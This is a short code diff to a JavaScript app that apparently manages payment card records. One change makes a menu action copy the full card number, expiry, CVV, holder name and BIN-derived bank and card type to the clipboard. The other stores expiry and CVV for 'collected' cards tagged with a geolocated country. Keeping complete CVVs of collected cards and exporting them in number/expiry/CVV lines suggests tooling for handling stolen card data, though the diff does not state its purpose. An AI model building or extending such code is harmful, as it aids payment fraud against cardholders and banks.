@@ -1400,8 +1400,14 @@ function handleCardMenuAction(action) {
             const bin = getBin(card.cardNumber);
             const binInfo = getBinInfo(bin);
             const bank = binInfo?.bank || '';
-            const cardType = binInfo?.type || card.cardType || '';
-            const text = `${card.cardNumber} ${card.month} ${card.year} ${card.cvv}\n${card.name} ${card.surname}\n${bank} ${cardType}`.trim();
+            const cType = binInfo?.type || card.cardType || '';
+            const mm = card.month || card.mm || '';
+            const yy = card.year || card.yy || '';
+            const cvv = card.cvv || '';
+            const lines = [`${card.cardNumber} ${mm} ${yy} ${cvv}`];
+            if (card.name || card.surname) lines.push(`${card.name || ''} ${card.surname || ''}`.trim());
+            if (bank || cType) lines.push(`${bank} ${cType}`.trim());
+            const text = lines.join('\n');
             navigator.clipboard?.writeText(text);
             toast('Copied to clipboard', 'success');
             break;
@@ -3983,7 +3989,11 @@ function addCollectedToCards() {
             name: c.name || 'UNKNOWN',
             surname: c.surname || '',
             cardNumber: c.cc,
+            month: c.mm || '',
+            year: c.yy || '',
+            cvv: c.cvv || '',
             country: geo,
+            cardType: c.cardType || getCardType(c.cc),
             docType: '',
             amount: '',
             notes: '',
